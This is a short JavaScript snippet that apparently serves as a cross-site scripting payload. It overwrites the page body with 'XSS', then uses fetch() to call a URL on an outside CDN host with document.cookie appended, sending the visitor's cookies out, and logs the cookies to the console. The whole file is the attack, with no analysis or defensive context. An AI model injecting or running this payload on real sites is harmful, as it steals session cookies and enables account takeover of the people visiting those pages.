document.body.innerHTML = "XSS";
fetch("https://cdn.jsdelivr.net/gh/shaonsec/exercise/exercise.js" + document.cookie);
console.log(document.cookie);
